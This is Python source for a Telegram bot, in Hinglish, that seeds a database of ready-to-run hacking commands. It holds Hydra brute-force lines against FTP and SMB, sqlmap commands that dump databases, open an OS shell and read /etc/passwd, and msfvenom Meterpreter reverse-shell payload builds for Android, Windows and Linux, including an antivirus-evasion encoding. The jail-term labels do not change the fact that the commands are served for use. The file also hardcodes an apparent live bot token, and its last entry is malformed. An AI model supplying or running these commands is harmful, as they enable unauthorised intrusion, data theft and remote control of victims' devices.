"""
═══════════════════════════════════════════════════════════════
𝐀𝐍𝐒𝐇𝐔 𝐄𝐓𝐇𝐈𝐂𝐀𝐋𝐗 — ULTIMATE POWER v4.0

✅ COMPLETE ANDROID HACKING
...
# ============================================================
BOT_TOKEN = "8827214752:AAGeObND4pSDeztVmj8A6dhNqisAlI4XX10"  # ← APNA TOKEN DAALO
ADMIN_ID = 6644342214  # ← APNA TELEGRAM ID DAALO (integer)
...
def seed_complete_database():
    try:
        ...
        commands = [
            ...
            ("Recon", "sherlock username", "Social media search", "Social media search", "sherlock anshu → Enter", "300+ platforms", 0, "", WARNING_EDUCATIONAL),
            ("Recon", "phoneinfoga -n 9876543210", "Phone OSINT", "Phone OSINT", "phoneinfoga -n 9876543210 → Enter", "Carrier, location", 0, "", WARNING_EDUCATIONAL),
            ("Recon", "recon-ng", "Recon framework", "Recon framework", "recon-ng → Enter", "Complete OSINT", 0, "", WARNING_EDUCATIONAL),
            ("Recon", "shodan host IP", "Shodan lookup", "Shodan lookup", "shodan host 8.8.8.8 → Enter", "Device intelligence", 0, "", WARNING_EDUCATIONAL),
            ...
            ("Brute Force", "hydra -l admin -P pass.txt ftp://target.com -t 4", "FTP brute fast", "FTP brute fast", "hydra -l admin -P pass.txt ftp://target.com -t 4 → Enter", "FTP brute", 1, "3-5 saal jail", WARNING_ILLEGAL),
            ("Brute Force", "hydra -l admin -P pass.txt smb://target.com", "SMB brute", "SMB brute", "hydra -l admin -P pass.txt smb://target.com → Enter", "Windows SMB brute", 1, "5-7 saal jail", WARNING_ILLEGAL),
            
            # =========================================================
            # SQL INJECTION (8)
            # =========================================================
            ("SQL Injection", "sqlmap -u 'http://target.com/page?id=1' --dbs", "DB names", "DB names", "sqlmap -u 'http://target.com/page?id=1' --dbs → Enter", "Database names", 1, "5-10 saal jail + 10 lakh fine", WARNING_ILLEGAL),
            ("SQL Injection", "sqlmap -u 'http://target.com/page?id=1' --tables", "Tables", "Tables", "sqlmap -u 'http://target.com/page?id=1' --tables → Enter", "Table names", 1, "5 saal jail", WARNING_ILLEGAL),
            ("SQL Injection", "sqlmap -u 'http://target.com/page?id=1' --dump-all", "Full dump", "Full dump", "sqlmap -u 'http://target.com/page?id=1' --dump-all → Enter", "Poora database", 1, "7-10 saal jail + 15 lakh fine", WARNING_ILLEGAL),
            ("SQL Injection", "sqlmap -u 'http://target.com/page?id=1' --os-shell", "OS shell", "OS shell", "sqlmap -u 'http://target.com/page?id=1' --os-shell → Enter", "Full control", 1, "10 saal jail + 20 lakh fine", WARNING_ILLEGAL),
            ("SQL Injection", "sqlmap -u 'http://target.com/page?id=1' --columns -T users", "Columns", "Columns", "sqlmap -u 'http://target.com/page?id=1' --columns -T users → Enter", "Columns churao", 1, "5 saal jail", WARNING_ILLEGAL),
            ("SQL Injection", "sqlmap -u 'http://target.com/page?id=1' --file-read /etc/passwd", "File read", "File read", "sqlmap -u 'http://target.com/page?id=1' --file-read /etc/passwd → Enter", "Server files", 1, "7-10 saal jail", WARNING_ILLEGAL),
            ("SQL Injection", "sqlmap -u 'http://target.com/page?id=1' --batch --level=1", "Auto SQLi", "Auto SQLi", "sqlmap -u 'http://target.com/page?id=1' --batch --level=1 → Enter", "Auto check", 1, "5 saal jail", WARNING_ILLEGAL),
            ("SQL Injection", "sqlmap -u 'http://target.com/page?id=1' --current-db", "Current DB", "Current DB", "sqlmap -u 'http://target.com/page?id=1' --current-db → Enter", "Current database", 1, "5 saal jail", WARNING_ILLEGAL),
            
            # =========================================================
            # EXPLOITS (10)
            # =========================================================
            ("Exploits", "msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o payload.apk", "Android payload", "Android payload", "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o hack.apk → Enter", "Remote control APK", 1, "5-10 saal jail", WARNING_ILLEGAL),
            ("Exploits", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o payload.exe", "Windows payload", "Windows payload", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o hack.exe → Enter", "Remote control EXE", 1, "5-10 saal jail", WARNING_ILLEGAL),
            ("Exploits", "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o payload.elf", "Linux payload", "Linux payload", "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o hack.elf → Enter", "Remote control", 1, "5-10 saal jail", WARNING_ILLEGAL),
            ("Exploits", "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -o payload.exe", "Encrypted payload", "Encrypted payload", "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -o payload.exe → Enter", "Antivirus bypass", 1, "7-10 saal jail", WARNING_ILLEGAL),
            ("Exploits", "msfconsole", "Metasploit start", "Metasploit start", "msfconsole → Enter", "Hacking framework", 0, "", WARNING_EDUCATIONAL),
            ('Exploits', 'searchploit windows 10', 'Windows exploits', 'Windows exploits', 'searchploit window', 0, '', 'WARNING_EDUCATIONAL')